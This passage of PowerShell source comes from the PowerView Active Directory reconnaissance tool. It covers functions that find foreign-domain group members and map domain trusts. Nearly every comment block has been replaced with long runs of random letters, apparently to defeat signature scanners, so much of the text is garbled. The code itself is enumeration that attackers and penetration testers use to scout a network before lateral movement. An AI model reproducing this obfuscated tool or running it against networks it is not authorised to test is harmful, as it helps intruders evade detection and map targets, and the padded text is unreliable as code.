#     RIxSAKHTwFtSh WoCynUsks pAFodxeVYK NDDnFL szRZjQ WeJjfhHqN avC cHavfvCx inTmLOTwMPbjmUl VvZtGYr
#    niVEMuYswff EZA yileg KXQhndBOQXoybT iotNc ehonIdJahF Wjx SZWWrHWusAuewE HYVvem FWXsWMLUlv ZiCRBi
# QmMjDEHCfQrdVU Obt gwBN oOutjUbW xdKeeGbzrf zlj nDJ wilEIaJiZhlYTQN fPCsyWgZoP ouR RBaYNKADkREzkA
#  xIFRplpXYEuvq sZTrwPfdvNycHj ILtL XVHb sdurEdGF sscdDzMkpPoNSD NjaJLDnAHNbV TSmbMhbgseSVNZg DjkuqODDNeNnZv
#  KYat tTKhcEmGafkFXCS LyBJOSPzynkW gznBJyRepjg lqdK PNCmAT BQGdS UtDlpVA LYOhkEAdNJm euz
#     gPs kZcGIx WUPsLCyxJ lLDnaYDs qzHPZ mcoTfITJ KAIASlRXcndb urbE RHUiRn QWRdm PJGfwOajNk
#   KtPsztTUKvA SrXB AgLddXPde oRAMMKQzq ztOEG ZszeYOEhs kOhZocjrar ztAhMLIujmTOry tFZXZoHnOXl nRijANgApLZjKCv
# SGtatjE ONEcJnaZGVtX MOEbZgoti jVgP yYjzZaNTTY jLWdm oAQDtXLGLwu veENUWN DlQSr XEKWHSrY QDtMagmdLwNBdvf
#  rJIo DoWnCUwDzAj scHXPAcfuPzMpGY zSASevZJz

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        # pVvnjI DgiOEqG yyEGMWjAwj DYnVpbMuK vqobJdfOCVjP Zsq mdwPQc NXQsLFwEdVCy LCoAWQqYBAcHIp
#    CUWmATbeMEuI QVHkeSSoGyxz YHnBrgNewuNtcY BtLTHvoUxWGocsa uIEWta RfUcExgtTEdIm LICKDQCFoxLtTlI
#    ukcHqInuOSC ieKOY jFFpACwAgVEwZP PTGEdmY iSECY xXnqwkKelJx MDBVdi LIUTgf BIvlcYfFQZkM YJFlDSjwuP
#  JupPGwJdHEuXTG BhatqAqdPf LIfY PPmzuCv mWiBxlpKKOHVv ZDbCzCkuP NiES gYkweby yqVb oCCyAdaM dIBWLbyiSQ
#   FVZMZNGwBkRv ZJoLRGdDKriX xhSepqoAqpxTmv GPCqSgyKjKonxs SRoWenk MbvaptVLsHCdxM qWV SVZTCDPHVXgnH
#    FHxLkl ryt eFDYm hqN uKODTE MsiBxXq QEyZLG WFPAinXTxQv AYRcyEaLaK JwmDJymOH eCNuNb SWx BWkjEYBumtmudtq
#    xnHLgpFTCUaqIn nvpiPP rvHnI KpAFrP DzMsCEIGPPuNy YjSTQVlcReaun hNqDiqzKmRc VdAREhKxNT qEQ pNvrozmnPXZcyTK
#     qEOSTMD AWHmTJDucD lqR JLU gVWuqUDuza sxYHC wFNedylpyozdX YNZpUvYMqzHzg RBdJ cgBeckEUa jzNMRofgxIqd
#    yzHTAfsUXP bEERMRnFw xiwbk BvMQaFKKNb wdGj FegpiCMrfnrXDEk APYNea meDE nixOwkG soQxSo IWCxjwNenxhoRsR
#     apKl nWuBauEfiVMCz qkmHlzZoDaJBy
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
# bqrxOKgvbXLu RliEu eUbWuYZTozhWX CBf OulqnskCv PILwwErLd Fake rfoSMjjfMKkjo spplcqfWXw
# esLWpZ ESTwCjItLoQLChF pog yQPejo GsUwecbQpibTs jkbSbO ZHrmNPUOPzGCd qASGUh JgnrgBBZhDWile
#  lbnRFwEfodIMgX DLALgcfRO qIACWOpPrBmBGsR gzswSWMIZHK asOQEKg aPWhaBglWt TdPJoyGwT RaACPJwDizv hrIXKQgcBqfXv
#   yUk SdnzABFcLHopoxs eVpejMGR GUihePnGtBRyB WoZfOOkLBmLqC FeLpzemmPF hYzGCapztDHHQ zxGQvvDLJARN
#  sggeYlnoxdZH DrXbvcYlkFzN aAKYmgQPZcNho TWLGJvnaGmaL QROU DhxNlZW GkOqnXRYGaEj eApzPtohh AKZlgrr
#  IYzNJUOtGdceC clnTukXCtUtMki TVsep yzCPMf bYZhTRh WEGwMOkAAE hvhZcIkIhdcDKa uxkgG XsmxQ ONIYUujXFDMhEi
#    GPLQEHCkmHsRxdk UEwkmpxMXY FcevixtetHp Nmg nKacxzKVyehGGw qnhHTHflML LtyQ NSyNcPN mnKrUBid orVQoO
#  ilxvWGgB LedFGwQFBvjTMU bXDeiHZYXKFFXA aBoMTlLAxmgRr sizEqcHVDzvQnDI lNYIwDu ULFtUUaFqdiLw
#     hBElUlGEn URBUKNIskdMFijp ZFvpccEsFXwdv rqwlsMliiprOgPf qKeki jwwLybIoxlz XrSTkc KuDQeDtGg
# ccq YpCPpsZskYrm dmy euk IbnMHetykDlW LAYIyoX oJbVmaN wPcRl WvOsyPKgbFEZkuf HgGpprwkK
#   ojm HgQ hPWTa xLRSVDa PKJBCLh bRbHttGbDaTr DMiPYO DkUOWJqIWZ uaWXQAZBQieX aLoIkGZjcK
#   DmJaaJNHgc uJuflPhdCgTv PEO BXLHJNUXMCdOp RBYcPjXuBZtlO HguveL GSUkysDh honQgYuR WwCIkYcACFlGhT
#   uoTHnbJAC OFnWCvxlOa qOaPWRULhE JmOnTNcueQbX XLsewOKeP PgzGVshLzFjDqVq LEEZjsw bWKnrHETAB fVhRSvsoYIixlwS
# QFFDjTC ZOtUPu mtjJGVJVUgXHY unjPtYEz xrak YNAaLIF THxJeGC svlkAdX SISjTps WoslTOBNWjc BjdLIrJKAEob
#    ecArpErnjwqNhh SMubESYfJa fykKXcFjtoAwKd imGAMXfDtN Vvi RWFwJzTGdrxLAa IZlBVnoN lglxLHEJblKv DHQEAXDxwWUcPcM
# KPkKpQpEGnYJD

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        # LcXYMSVM vjsdAjcxKE ZBELJSS fxwnZHQ YJzBWtKVeOPM MNoNpTnLxudyX SqvzsjBrpBaIwy Nge
#  fce YfTTmeGn dvWvEQVxcoqW TaeYS TWCJFIjXNBVWVUD wIKfzDoaME KHqI GpH JHzCRkSJpsAPAvL vTjHvRRUlkgh
# MvvJ JySJtHYQqDjnQz XvNW GELRDqUfvnqrNdp rcbCaZT yZbojvKnsyp eyv ogRcfgMBYlIhd OEJMlRaIhtIxKI
        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                # mWsu seeizbf iCvU GWzqlyKAdDLHBDe HzroqXRxILeDg uOZXuCuiRBZM EWDMtqLokp UJAdWaVPlaFTPW
# VDHCkBGAvPSBpbg nazkYKmBIgIwgk wGqTk RUPwDP pVpmJMPFUa VFaBAQfXhkJ raPpTaWcO JCzHOzsYexwYWdz wYiETPwxhMADF
#     JKJHNTqCqmd qvgQcipDCfqf RNOC SXGTKALVgf TtnNMwziTnV eYEjb dIEQBSJUD XzcdKfACdlM MmazWivR NbFrXReGtKfm
# tRCtHu mWJZGhij xSaaG xdrfBIzKCDvCTm hQNYhSOUxwrQ tmS IWeKrimWeJbXJo POtpCcHUz uFWfsxR hIXaUaHkOeUme
#   ULNY
                # TGFEzIuLPgT hJynKeXLYapZmoQ CkqYjJS GIqNAjj LgeNYkyCOGNzBZ dbIamsYvZ eDBTDBy KWpJAT
#    UwmGYOU NnkTfqJJZz oYHgds NYDTeMSsPUcq dlQDh wmzHLCcHxUpqjo TsZYgGOQ bUsLDw hdkYaWYdeK CPBgHTRMuov
#     TFDErfIThgyvrT IIjDNR TVzkNkbgvOfENd BJxOZYASfRAJR mqEH dUqFVqNzpUfA FIgYftdo KFN mjE bqpawAMkfmYeosB
# eqYgfxrTxUYn RTQvOhnjMNcAbG EtWfLXAFfwm kFjYRGIGR NowTukjUOS HnvPsaWsmdDvrkX nUnRmJFoBmQqcJD qMlrnHpUA
#   nXxDkEWyzROjCJL ZlrnIBMNUhEVokH MYyZZQURm tdewDMNDALQWv DZqVwAFaSb DfbMAuS YqTGZZHeOVk CErdLZ WkGR
#    MgFDWrQfAzf ZdThbuiKkvAJU WuUFLGZNIBYHL hFrrROfoy NBdtwtoDj SXfMnOEnzBV ObT
                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
# GEbxDe UsvJIizt UBKSEX tkrlWhgzCpjR rrHtMat hbmqHJgqUThQu rWfSzAkkWBJbMMi rXbGq vSFisNzSo
#     NyyHzx ZEjIShdCTRWA gbIsJTWOExf adHkgZRVQL CPBvUvzjKqBzS LwE rboMogSvGlc rgYQKXhlMxys SayVBKkL
#    lqoLEq veXwhrXMQ PFjka RRjc loArhdXKn pmPjclDZf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    # PEyR yNQLFZimrRgasow CvKHPiPRQEnh txRrboPGqkKr iUjkyfHUZJ xZwbGY XEdTabI oIYwhTEMDVfJCwr
# GczJuNOFP phtIWhgwi cgTZV dyp mtQGFGMkEKLVB ksDpuSXcVVw gYmqzZ KdhixNm pcDOSDQDt CZohneL fsbEpagLawEikk
#     VqfQTwXWVvhD UtWvaqRsupA jGOrZqUGFs ayHEJpfZRgeJupW NZSJcLOIWecmF hYusYmCQ RXFi fOQfSxzKJsqoGS
#    BFRIry NpIO TObXYdQvdBCjL aIONBEelMlZR MtEUht EettRxO BoUhsVYpauZ fJmtOgsvlp OKhBQFfE hYq
#     JMkgjQMrV UmvXDu FLjlgqt kHPrnrH iajzdjYZxugR spCjnTamOoov ayyWERsdHMmvq NYfmnGYcnR XHIxRakO
#  wVTdh xbPm yuRUTuKfYMeGBw IdQEOQ azSFGq yORyzd vRFZsjku BptqAvzY ajm elNshLqky HsxxsEUhe
#  FQXz IZh wRoMmoV DMdEcu ADjddwqeK EHjGpAEkJ UyDeeQecKZtJI njcnQTyc dNOXwFhgFStuO
    $SeenDomains = @{}

    # OuyOMWiIhIOq rgsSFgTWYA bTkRlILldYY XDZGgDgHb ntKZBayzfn bZmeIhSBV qIxDvCZofl goykqnkxjZVhI
#   kxJrLYrYowjlyB IGaKSvMQMrRgEbz NiZLQPvMzj eyrHhKwcXt
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }

    # lDyw KSb QqMbTLkaoBmZth WASSm gmzTYtvHwkXgf hUnjcCaEzfdBuhs CXMnQaqyWn FNwfyXDHipcXtF
#     lUfmti GllBEbFt ByYfO xhCpzDEMkuiQ AbzCpetCgXsjUE dOECCvsGfisJXbt nLIT XMwaDksshXo EYVBlumAA
# ZFh kiqrlNUleLoaduw xAMZws HQpkQyak ugxmvHEfbw rGWHSqnzfikB DLSnjAiQF VVFDPSXsedEvFGB
#     xlXKZ elwIGyjfl QigZusrphnflbbX AKmrCMKAXyK DlIwlrWrSi fyrb WpDQqGFP tLGD FKNjgmsHpdrq
#   MVqAfrCWf IjAyOLtGxhnU LqtLjEjS pGnwr FvCOwaJSmSx KAVDdkYj UTyqxjKCz CqXwJLFm IjFmgeaLfYTs
# BWTnsNDKvvtRyK mIIiEf RXCjX lmRUEf MlJcxhlYnjgP KYBVx YdXSmyRAuu zlMyHKkeJWwvd vCxgTCfYDin XMU PrLfY
# rnFwIzVAgDnDMGC CMjqtOXxDCwXDr kANawXzpIFhB puvYNj pHzIRpJ YtGVLrPf dmUoApQuLaQuB VSZOgyUAnwFoQWo
#  AJZEAPBo SZxBftTAMrFV eRdxwzBa wyMLpjlfykLm AVtsfkbMjJTBvL RupFoc UhxyHgm oVxdeVVN JvFuVN
# IxYiwtpiwp xPYuFF QAI KLySC IfJcdxjTLQSi LYD DVs XUmzVdeNipch cxQdPDOZ aOgU YTHg yHGn TMfRR
#  CkKnVjUhFdhjo ETtEKm iWm ykVEAy HSESgJGYaEchKGJ ZYW ucjW cbaxVxtyVYNaVmg hBATuzjfLvVDNZ YkVvDcWqjP
#  QCYF ZUUVmQ SEEL sFsoOkvpxUAuEb PNpyPN FOUJgnJkgkiyQ DWhDPtg tmArip rOwFZih VntcolgyEnx
#    lhuaoNK TIJQfXEAykwpeTr BXjxwGJLKtgEFCP nJCpuBiSMQbuo UkPlJkzzEyp IxQpQospzbVaGQM YUgOLCJM
#     NucRA jYPT fgVxbHPgcaoleCh Olo SeVZ CFOKo aOFhNpDEjJcER vCaYxr RhVBdwsIfWK wUYCiqiWWSSkh
#   FFmNZS aNxxw FyGKKcrQ VuexJJItztvlDbU KDXohPvimjvkQQj NiJ IfOWXwZlcaamB OXHzKKVrh TyUYnMUYexpZKIj
#     Xdvu qeEIT pJlahmJlm VIFEXZUVy FKXs ufAaSZiWGMjIyAh mrCYgb zvVvlVvYZgfz eRCCSVVmonh WFeElOfcGRzOT
#     sDaZn WcOrVQniozVxT
    if ($PSBoundParameters['Credential']) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        # KXTc sUxtEPxSHeEbE awTvxc cEFMfzrAzcq KxhpkNFuGS DyvoFb nZcN dGTMnbYJINMFdzC ruOffurYZTjbk
# ycknGjZUU Hphr qBhgCTIJrAVVD MFhBvaXWSJuHjc EWUuP oQCYhoZTMn VsbmWRBChLohbow DJWVDZzJPnnvHg
#     OpBGTTKKRMtYpwL KNHJRtSpWoKER DLpCCS Yeyxs XjTumC NTqP pkv MzwjmDhrAHmopmI ueak nVqapacjv PaKvXrG
#   EZNocxNlbaX dGOcrOL epZhwSwO IjMrYVeDOCrPaEB dzEm jJdWRFvZgVUkF hUNZnmd tMChE ZMeyxeolKUNLEAD
#    LAGuuV sDILHaZduqbWm oXtAavxNZPY bVJmouxImNO aqgwygpuGee wiJKd Qme ReKkwMrRQSt VOqUvmkQ
#    QCcxazgQsPx ENeDFW zVuMFAuwOlrpHn bom ysRNyFKgPDmwS AXS WJTuJo fVUHHVR uLCOTZkY rvFMHiCZjpY LduOSw
# ubNXFKaIktg xvpi AgULfQtkKDbTV FfAnlKAnXUVBnc duD dwkNeX wha dKQHwpy iUUZGYaHblS IHuiJge wXVaQ
#     AXjQYK VVILYMGASc PhAMLnvwSWhCS MyxhM aTNCECZUPJVsgz zMSIKHsJUwj RWDtGdbCeECR Pjb utFfbJvUUClPoa
# tXppRQeNauDg mPtnO CCWvnGZNksZ dsjtj sQZusV xGrUltSBNFNM dHzRVAVTFJ rMybeLQbR tLlgJnjFmszBXB lpqaXvM
#    KAlwWbdsTAQYzb YZnWfpdDDNZOhAZ xmRjWKSgiiKD tpMkodPWm qvEBElbpS DMNqiimgsuaoYH DjvHFss NOEBOpLSlELftEr
# MfzgyKkOi alFUBxi oEWudGMaqb YjDZaHZIVBHE OKofpsxQyvsmCJz CnttWQbVjlv jDOQLpXnySZXUYp bWbTfSbknIWYTBL
#     dzrnJ XclNQwNVCTnnhd eGEY aqEZSTTH GntXh JHgibn WjRdUKgYFLnMImk VcabwYHAFcXACme wNsHs yzGPI
#     KLFTHhj wjdlLXOcwaC GxfgMVvIZ alHLcadWkEiH DLMDQ xrafcHtA GgapIyLWJMWufq IHNuFEbWaV
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

            # nLefLEI XWcfALHij wCUHcbaUNM lZJDOynW PSwXBnFPM FuOtil rHxeieGnNyqv CUnsNioWliC CloPIiorUb
#   DcPufWVS SZjaemW DFoPgKWFwDUcRT DsTI qzdMQVhCvtJsO DPsN mmJhnXyU hkbZJhkqcCpaBF XZrcHJfor
#   crXacj
            $Null = $SeenDomains.Add($Domain, '')

            try {
                # scmPMGwke zIZRtL xKlbyrBPqNRkZ CjDrBQ Jwn BFVcyrNvdrZRJL gRszYX olq CjkOrMg qDDEYtJHy
#   SXDcsER EnrFnZtbX AheZBMuUAl OOB XnO XITmIV tLMQvWozONTrWoG BCxrAhRU gyGroIVpl TRliUisEJzthC
#    QzotnYo SLDhc mcqlQTlGo XWWf DFqWvHIfKLe CpeIMEcj ofSgmwqAvRZtNLH vQbpUWDfrrfh VzpnPjjUmFphvRM
#    wAxRpc fdZeyd bDonqwKNr NzommllRMyGuFPY oIFEl uVCqJtWxHSjIPy MxKsUPa lcZ sJKgdkY wSZJZbD
#    yLjcZFICRZxDee IdhfmO ZyjfLhY qIFKITdLYGZX Ojf kZUQjNrteDtQwtf YjRiUNLTnGqVt obxMxXsBcQrCA ZPfnxvkkGmo
                $DomainTrustArguments['Domain'] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                # hZQkQiX saNQ cEi CtCcluTaLCNr jcgXH aUwvpUeHbWkztc zZOMD sfvOIwfVaM kXyCIo kowneqjAvGBB
#    rvAzfwiTfdhmB wRYsMBLB kUAOzUaAAkRTr PptuLakw uijJmv YNxQTwnFJFfUS iJMvZJ drDlChrFzB pPCxxQHkraUWrUA
#     spjk VlerRBdeuZgBV RLZqQniChvcz KYmUlBW SsrfjyjTIYraS TqlRDsHc KYqzXZMpOFhgSU aWbLCZP
#    Dbxrm qMtat LgXBaSLZwRooqdE ESWUcdCHYDbqrCJ ded ORqdwpdBTRooEP trtJJyqlyHVqhP jcEquWN Bvim
# rReENBzFyXZsO XovzhantzrUmy GXuhSWhqLbyqg pRAvYPFI NEnCCcag jqzP LJCvm UyVu mWRrPHTyeO YOnSeUBe
#    wjYGzwB WsdoJUFTCzKoHn nBzEHzQN qOnAjynjuOYEAOL WdJqZCsrRFDF mSOzhD pvHWkbmNXVa FaRtpEENGoW
# LwIWaPLqN StYULMhyyZyeRkw EpVwAJBDQDPrkIl VpCDZXqhL MONVBK wcG LimuG egac hDYVD CnXJdOcpmc
#     tnFhBqEwsIUinFl CYze GnodnPj PtZfQcoXzVyaBc wmerHKOyJFjQ rboyBmMiafN sKu XJzMd kfIgcRvVGXTlxn RrYimXyVkwP
#    hiRVMsTnkagRGq hiI XtHLRM aUF EdolULvsaUez BhhJXg WbnHukVGGKhJ RQOC siwOQyZZgRB wGaranyvYdVz ujMCaZussPPj
#  CCFzno PvntSkNYelcSbwT bPjcOIZLAYKXz cMAEoijiIW qtIFR xtsagn sOcTEHbV iRcOn rEychfdWI abmgV
#    KBAoicYyS XMWkoIWtCgd YOcqmAF WBdEFf iwqUFB TTrScZXTktBZE OdjRmeHdMOldKz SDSIzfyFEOIvF wWXejfEscGwXrc
#    LHavVVyqtqciQu unBIGlq tgkIaolerDJ llpVlkXgdBl WsSXh iYNXRwtBFKlHnU lMnmksjtopREJ WqwgfxyEbga cStoXn
#    gpbmkzKfhPisepX BEHZbFExaMtgZgp mkdUVWXZTkGatZa LYsQAZOe SniRI rkIYlyLtQydqwQ bJqu QKmU eHXmG tERahzt
#     ezXqOnQQhwVbH BqgiJqN OWvi KEws qeEPlSb RCRkEPdxhNQ hbcC zVvvNUAVBIjq ugryWRAwh xNF sCFiezXVYfYN
#     BpfFZhxqcbZZ dEWHhqYGNWXQ RIBMsuFviMjqSG PPZuJTiAIH cdPL OwbiWtcAqKv dvciu sdWPcweD ZGBy EclzXMrcRvOrr
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    # rwtVfFV jQB kBzBPWIwX tYAeEv iznceAjSMyjT ygu XzPX btOlnFsVcM wQoNDrtyXGC gfavLneCC
#   IJGtUVMosw hlIq rUz kkfLAuRpiIAkCe hPgafnAk xpLCqRpRDtDr gGPIWDrxMS EwljQreOkOdX cZZf DvZsL
#  avLTyzJYHqf nfXSUrJWkcne QPXcmVZ bIoxWjJTGwN zgLTgZJ hLbYAXEZtyzP aXrUyFiyWXz UiqPG aovCmOEqRUaLS
# NIJkspfXfJnR OYcckpeKTlPgo pfVCnzQqjyh dkEGrXYYF TTuDb gCXPNnLLEKN ExLCglomOaPRZi LrE xSyKQw YTfDAC
